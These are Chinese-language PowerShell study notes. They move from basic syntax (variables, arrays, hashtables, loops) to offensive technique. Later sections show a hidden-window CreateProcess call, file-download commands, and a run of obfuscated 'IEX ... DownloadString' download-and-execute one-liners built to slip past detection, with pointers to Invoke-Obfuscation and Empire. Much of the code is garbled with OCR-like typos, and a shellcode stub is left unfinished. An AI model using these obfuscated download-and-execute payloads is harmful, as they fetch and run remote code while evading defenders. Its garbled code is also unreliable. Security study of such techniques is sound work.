1.执行策略

```
Get-ExecutionPolicy
```

```
Set-ExecutionPolicy
```

2.powershell编辑器
![[image-2023070907.png]]


基本语法：
对缩进不敏感
没有强制的分号
以{}作为代码块
保留字和命令必须是大小写区分的




## 1.变量

$a=1
clear-variable 删除变量
GetType(a)      获得变量类型
$global:a=1 全局变量
$script:a=1 脚本变量

```
| 编号 | 变量     | 描述                 |
|:-------|:------- |:----------------|
|1| $$|此变量用于表示会话接收到的最后一行中的最后一个令牌。|
|2 | $? | 此变量用于表示最后一个操作的执行状态。如果没有错误，则返回True，否则返回False。|
|  3 | $^ |此变量用于表示会话接收到的最后一行中的第一个令牌。|
|  4 |$_ |此变量充当$PSItem，它在管道对象中包含当前对象。 |
|  5 | $args| 此变量包含未声明参数的值的数组，这些值传递给脚本，函数或脚本块。|
|  6 | $ConsoleFileName|此变量用于表示控制台文件的路径，该文件最近在会话中使用。|
|  7 |$Error| 此变量用于包含代表最新错误的错误对象数组。|
|  8 | $Event| 此变量用于包含PSEventArgs的对象。PSEventArgs是用于表示正在处理的事件的对象。|
|  9 | $EventSubscriber| 此变量用于包含PSEventSubscriber的对象。该对象包含正在处理的事件的事件订阅者。 |
| 10 | $EventArgs  | 此变量用于包含一个对象，该对象表示第一个事件的参数。 |
| 11 | $false     | 此变量用于表示False。   |
| 12 | $foreach  | 此变量用于包含ForEach循环的枚举数。该变量仅在执行ForEach循环时存在。并在循环完成后删除。 |
| 13 | $Home  | 此变量用于表示用户主目录的完整路径  |
| 14 | $input | 此变量包含一个枚举器，该枚举器枚举传递给该函数的所有输入。它仅适用于脚本块和功能。 |
| 15 | $Host     | 此变量包含一个对象，该对象显示Windows PowerShell的当前主机应用程序。       |
| 16 |$IsLinux   |如果当前会话在Linux操作系统上运行，则此变量值为$True，否则为$False。 |
| 17 |$IsWindows   | 如果当前会话在Windows操作系统上运行，则此变量值为$True，否则为$False。                             |
| 18 |$IsMacOS  | 如果当前会话在MacOS操作系统上运行，则此变量值为$True，否则为$False。  |
| 19 | $null | 此变量用于表示null值或空值。可以使用它来表示脚本和命令中缺少或未定义的值。 |
| 20 | $PID |此变量显示进程的PID，该进程正在托管当前PowerShell的会话。|
| 21 | $PSItem| 此变量充当$_，它在管道对象中包含当前对象。|
| 22 | $PSHome| 此变量表示Windows PowerShell安装目录的完整路径。|
| 23 | $PSVersionTable | 此变量用于表示只读哈希表，该哈希表显示有关当前会话中运行的PowerShell版本的详细信息。 |
| 24 |$PWD| 此变量用于包含路径对象，该路径对象显示当前目录的完整路径。 |
| 25 |$ShellId| 此变量用于表示当前Shell的标识符。 |

```

``` 
1.$$
此变量用于表示会话接收到的最后一行中的最后一个令牌。
2.$?
此变量用于表示最后一个操作的执行状态。如果没有错误，则返回True，否则返回False。
3.$^
此变量用于表示会话接收到的最后一行中的第一个令牌。
4.$_
此变量充当$PSItem，它在管道对象中包含当前对象。
5.$args
此变量包含未声明参数的值的数组，这些值传递给脚本，函数或脚本块。
6.$ConsoleFileName
此变量用于表示控制台文件的路径，该文件最近在会话中使用。
7.$Error
此变量用于包含代表最新错误的错误对象数组。
8.$Event
此变量用于包含PSEventArgs的对象。PSEventArgs是用于表示正在处理的事件的对象。
9.$EventSubscriber
此变量用于包含PSEventSubscriber的对象。该对象包含正在处理的事件的事件订阅者。
10.$EventArgs
此变量用于包含一个对象，该对象表示第一个事件的参数。
11.$false
此变量用于表示False。
12.$foreach
此变量用于包含ForEach循环的枚举数。该变量仅在执行ForEach循环时存在。并在循环完成后删除。
13.$Home
此变量用于表示用户主目录的完整路径
14.$input
此变量包含一个枚举器，该枚举器枚举传递给该函数的所有输入。它仅适用于脚本块和功能。
15.$Host
此变量包含一个对象，该对象显示Windows PowerShell的当前主机应用程序。
16.$IsLinux
如果当前会话在Linux操作系统上运行，则此变量值为$True，否则为$False。
17.$IsWindows
如果当前会话在Windows操作系统上运行，则此变量值为$True，否则为$False。
18.$IsMacOS
如果当前会话在MacOS操作系统上运行，则此变量值为$True，否则为$False。
19.$null
此变量用于表示null值或空值。可以使用它来表示脚本和命令中缺少或未定义的值。
20.$PID
此变量显示进程的PID，该进程正在托管当前PowerShell的会话。
21.$PSItem
此变量充当$_，它在管道对象中包含当前对象。
22.$PSHome
此变量表示Windows PowerShell安装目录的完整路径。
23.$PSVersionTable
此变量用于表示只读哈希表，该哈希表显示有关当前会话中运行的PowerShell版本的详细信息。
24.$PWD
此变量用于包含路径对象，该路径对象显示当前目录的完整路径。
25.$ShellId
此变量用于表示当前Shell的标识符。

```



## 2.对象的集合
### 2.1 数组
#### 1.创建和初始化数组
要在powershell中声明数组，可以使用赋值运算符将多个值分配给变量。逗号分隔存储在数组中的值。
以下语句是声明数组变量的语法：
```
variable_name = value1,value2,value3,...,valueN
```
示例：要创建和初始化$k数组，该数组包含5个整数值：10,15,20,50,99.在powershell中键入以下命令：
```
$k = 10,15,20,50,99
```
还可以使用范围运算符来初始化数组
示例：要创建和初始化数组$arr,该数组包含从2到10的值
```
$arr = 2..10
```

#### 2.访问数组袁术
eg1：假设数组$array1包含：11,20,30,50,66,99显示数组所有值：
```
$array1 = 11,20,30,50,66,99
$array1
```
还可以使用索引号从数组访问元素，将索引号括在方括号中
``` 
$variable_name [index_number]
```
访问3-6元素
```
$array[2..5]
```
使用负数访问数组的最后一部分,最后一个元素访问
```
$array[-1]
```

要以索引号升序显示数组最后四个元素
```
$array[-4..-1]
```
#### 3.数组大小
获取数组长度
```
$varible_name.Length
```
eg:如果创建一个新数组$a,其中包含5个元素, 数组长度为
```
$a.Length
```

#### 4.数组的操作
更改数组的值
```
$p[2]=20
```
使用+=将值添加到数组
``` 
$variable_name += value
```
``` 
$a+=15
```

#### 5.初始化一个空数组
```
$variable_name = @()
```

#### 6.从数组中删除元素
删除第一个和最后一个
```
$array = 20,25,35,50,68
$array = ($array[1] $array[2] $array[3])
```

### 2.2 字典
#### 1.语法
创建hash语法
```
$variable_name = @{ <key1> = <value>; <key2> = <value2>;.....;<KeyN> = <valueN>;}
```
创建有序字典
```
$variable_name = {order}@{<key1> = <value1>;<key2> = <value2>;.....;<KeyN> = <valueN>;}
```

#### 2.创建哈希表
步骤：
1.创建一个以@符号开头的哈希表
2.将hash表括在花括号中
3.输入一个或多个键值对作为哈希表的数据（内容）。
4.要分隔每个值的键，必须使用等号(=)
5.包含空格的键将它们括在引号中。并且这些值必须是powershell的有效表达式。
6.要管理或使用哈希表，请将哈希表分配给变量
7.将有序的哈希表分配给变量时，可以将有序的属性放在@符号之前

创建空的哈希表：
```
$variablename = @{}
```

创建哈希表时，我们还可以将其添加到hash表中，

```
$student = @{name="Maxsu";Course="数学";Age = 25}
```

### 3.显示hash表
显示哈希表，默认情况会显示带有两列的表，一列用于键，另一列用于键值
```
$Student
```

显示哈希表的所有键或者所有值，请用点(.)表示
```
$Student.keys
$Student.values
```

哈希表具有count属性
```
$Student.count
```

下面是一个完整的示例，演示了如何创建，初始化和处理哈希表
```
$hash = @{ID = 1;Shape = "Square";Color = "Blue"}

write-host("Print all hashable keys")
$hash.keys

write-host("Get ID")
$hash["ID"]

write-host("Get Shape")
$hash.Number

write-host("print Size")
$hash.Count

write-host("Add key-value")
$hash["Updated"]="Now"

write-host("Add key-value")
$hash.Add("Create","Now")

write-host("print Size")
$hash.Count

write-host("Remove key-value")
$hash.Remove("Updated")


write-host("print Size")
$hash.Count

write-host("sort by key")
$hash.GetEnumerator() | Sort-Object -Property key
```

注释为 #


### 4.运算符
https://learn.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-7.3
#### 4.1比较运算符
以下是相等比较运算符的列表
-eq(等于)
-ne(不等于)
-gt(大于)
-ge(大于或等于)
-lt(小于)
-le(小于或等于)
#### 4.2 匹配运算符
-like
-notlike
like后面可以添加通配符
-match
-notmatch
match可以添加正则
#### 4.3 包含运算符
-contain
-notcontain
-in
-notin
contains表示右边是否左边有 in表示左边是否右边有

### 5.控制流程
#### 5.1 选择
```
if (test_expression 1)
{
	Statement-1
	Statement-2.......
	Statement-N
}
else if(test_expression 2){
	Statement-1
	Statement-2.......
	Statement-N
}
else if(test_expression N){
	Statement-1
	Statement-2.......
	Statement-N
}
else
{
	Statement-1
	Statement-2.......
	Statement-N
}
```

```
$day = 3
swwitch($day)
{
	1(echo "今天是星期一")
	2(echo "今天是星期二")
	3(echo "今天是星期三")
	4(echo "今天是星期四")
	5(echo "今天是星期五")
	6(echo "今天是星期六")
	7(echo "今天是星期七")
	default(echo "请输入1-7")
}
```

#### 5.2 循环
##### 5.2.1 计次循环
```
for($x=1;$x -lt 10;$x=$x+1)
{
	echo $x
}
```

```
foreach($file in get-childitem)
{
	echo $file
}
```

##### 5.2.2 条件循环
```
while($count -le 5)
{
	echo $count
	$count +=1
}
```

```
$i=1
do{
	echo $i
	$i=$i+1
}while($i -le 10)
```

##### continue
```
$a = 1
while($a - le 10)
{
	if($a -eq 5)
	{
		$a+=1
		continue
		}
echo $a
$a +=1
}
```

##### break
```
for($a=1;$a -lt 10;$a++)
{
	if($a -eq 6)
	{
		break
	}
echo $a
}
```

### 6.函数
```
function mignzi([int]$x)
{
	$res = $x*$x
	return res
}
```

```
$x = mignzi(2)
```

### 7.win32api
```
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
uisng System.Runtime.InteropServices;
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
	public IntPtr hProcess;
	public IntPtr hThread;
	public uint dwProcessId;
	public uint dwThreadId;
}
[StructLayout(LayoutKind.Sequential,CharSet.Unicode)]
public struct STARTUPINFO
{
	public uint cb;
	public string lpReserved;
	public string lpTitle;
	public uint dwX;
	public uint dwY;
	public uint dwXSize;
	public uint dwYSize;
	public uint dwXCountChars;
	public uint dwYCountChars;
	public uint dwFillAttribute;
	public uint dwFlags;
	public short wShowWindow;
	public short cbReserved2;
	public IntPtr lpReserved2;
	public IntPtr hStdInput;
	public IntPtr hStdOutput;
	public IntPtr hStdError;
}
[StrctLayout(LayoutKind.Sequential)]
public struct SECURITY_ATTRIBUTES
{
	public int length;
	public IntPtr lpSecurityDescriptor;
	public bool bInheritHandle;
}
public static class Kernel32
{
	[DllImport("kernel32.d11"T SetLastError=true)]public static extern bool createProcess(
	string lpApplicationName,
	string lpcommandLine,
	ref SECURITY_ATTRIBUTES lpProcessAttributes,
	ref SECURITY_ATTRIBUTES lpThreadAttributes,
	boo1 bInheritHandles ,
	uint dwCreationFlags ,
	IntPtr lpEnvironment,
	string lpcurrentDirectory,
	ref STARTUPINFO lpstartupInfo,
	out PROCESS_INFORMATION lpPr ocessInformation) ;
}
"@
# StartupInfo Struct
$StartupInfo = New-object STARTUPINFO
$StartupInfo.dwFlags =ox00000001 # STARTF_USESHOWWINDOw
$StartupInfo.wShowWindow = 0x0000 # Sw_HIDE
$StartupInfo.cb = [System.Runtime.InteropServices .Marshal]::Sizeof($StartupInfo) # Struct Size
# ProcessInfo Struct
$processInfo = New-object PROCESS_INFORMATION
#SECURITY_ATTRIBUTES struct (Process &amp; Thread
$SecAttr = New-object SECURITY_ATTRIBUTES
$SecAttr.Length = [System. Runtime.Interopservices.Marsha1]: : sizeof(SsecAttr)
#Createprocess In CurrentDirectory
$Getcurrentpath = (Get-Item -path ". \ " -verbose).Fu11Name
#cal1CreateProcess
[Kernel32]::createProcess("c: \windows\System321cmd.exe" , "/c calc.exe"，[ref] $secAttr，[ref] $secAttr，$false,0x08000000，[IntPtr]: :Zero，$GetCurrentPath，[ref]$StartupInfo，[ref] $ProcessInfo) lout-null
```

### 8.下载文件
```
invoke-webrequest -Url $url -OutFile $output
```

```
(New-Object System.Net.webClient).DownloadFile($url,$output)
```

```
Start-BitsTransfer -Source $url -Destination $output
```

### 9.混淆
#### 实例
在混淆之前，先看看powershell编码执行的方式。

```
-EC,-EncodedCommand,-EncodedComman,-EncodedComma,-EncodedComm,......,Enc,-En,E
```  
那么这些参数都可以让代码编码执行，可见我们的混淆的选择是非常多的，而防御起来就越难。

我们在攻击时经常会远程下载代码脚本执行，这里基于这样的一条标准的下载文件命令来进行变形混淆。  
```
Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://127.0.0.1/powershell")
```

简单处理我们刚才的命令：  
```
Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://127.0.0.1/powershell")
```

1. 去掉System关键字  
```
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://127.0.0.1/powershell")
```
2. 使用字符串连接+号连接  
```
Invoke-Expression (New-Object Net.WebClient).DownloadString("ht"+"tp://127.0.0.1/powershell")
```
3. 使用Invoke方法  
  ```
  Invoke-Expression (New-Object Net.WebClient).
```

```
("DownloadString").Invoke('h'+'ttp://127.0.0.1/powershell') $ds="Down"+"loadString";Invoke-Expression (New-Object Net.WebClient).$ds.Invoke('h'+'ttp://127.0.0.1/powershell')
```
    
4. 变量替代  
```
IEX $test=New-Object Net.WebClient;$test.DownloadString('h'+'ttp://127.0.0.1/powershell')
```   
5. 关键字使用单双引号引起来  
```
Invoke-Expression (New-Object Net.WebClient)."DownloadString"('h'+'ttp://127.0.0.1/powershell')   
```
6. 转义符号  
```
Invoke-Expression (New-Object Net.WebClient)."D`o`wn`l`oad`Str`in`g"('h'+'ttp://7ell.me/power')
```   
7. 字符串反转
```
1. $re= ")'1/1.0.0.721//:ptth'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(";
2. IEX ($re[-1..-($re.Length)] -Join '') | IEX
```
8. 编码执行
```
1. $command = "Write-Host ‘Hello World!’"
2. $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
3. $encodedCommand = [Convert]::ToBase64String($bytes)
4. powershell.exe -EncodedCommand $encodedCommand
```
9. IEX
    
    我们使用的代码很多都使用Invoke-Expression/IEX命令，  
    Invoke-Expression/IEX命令是很常用的一个命令， 运行一个以字符串形式提供的PowerShell表达式。  
    这里也先看看代替IEX的各种执行方式
    
    1. `&(GAL I*X)` : 通过别名的方式来进行编码
    2. `Command I*e-E*` : 通过command的方式来进行编码
    3. `$ExecutionContext.InvokeCommand.GetCmdlets('I*e-E*')`使用环境变量等等
    4. …

ascii
```
[char [] [int []]$char=65,90]
echo $char
```

## 工具

> 那么讲了这么多，其实只是给大家讲了一下有这种编码方式，对于蓝队来说需要更深入的掌握，当让red team需要掌握的就更多了，下面给大家介绍几款混淆和编码框架供大家学习。

### Invoke-Obfuscation

下载地址：[https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

这个工具呢已经有dalao在freebuf上写过相关是使用方法—-[http://www.freebuf.com/sectool/136328.html](http://www.freebuf.com/sectool/136328.html)

简单介绍一下这个框架就是我们的powershell混淆框架，首先是启动

1. `Import-Module ./Invoke-Obfuscation.psd1`
2. `Invoke-Obfuscation`

启动之后是这样的：

![powershell(10)-混淆 - 图1](http://cdn.mianshigee.com/upload/tutorial/Powershell-Attack-Guide/1.png)

之后输入你的代码，然后可以选择你需要的编码

![powershell(10)-混淆 - 图2](http://cdn.mianshigee.com/upload/tutorial/Powershell-Attack-Guide/2.png)

我们来测试得到的结果：

![powershell(10)-混淆 - 图3](http://cdn.mianshigee.com/upload/tutorial/Powershell-Attack-Guide/3.png)

还有更多的使用技巧可以查看工具的官方文档进行学习。

### Empire

Empire是一个类似于Metasploit的渗透工具，可以从他的宣传语: _Building an Empire with PowerShell_ 看出Empire对于powershell的利用下了很大的功夫，集成了大量的攻击Payload可供选择，而且可以自己来选择编码，并且对不同的平台都能够支持，具体可以参看[官方文档](https://www.powershellempire.com/)，[Freebuf](http://www.freebuf.com/articles/web/76892.html)也有前人总结过一些用法。用法与MSF类似，这里就不过多介绍了。



使用堆加载shellcode
```

void main()
{
	HANDLE handle = HeapCreate(HEAP_CREAP)
}
```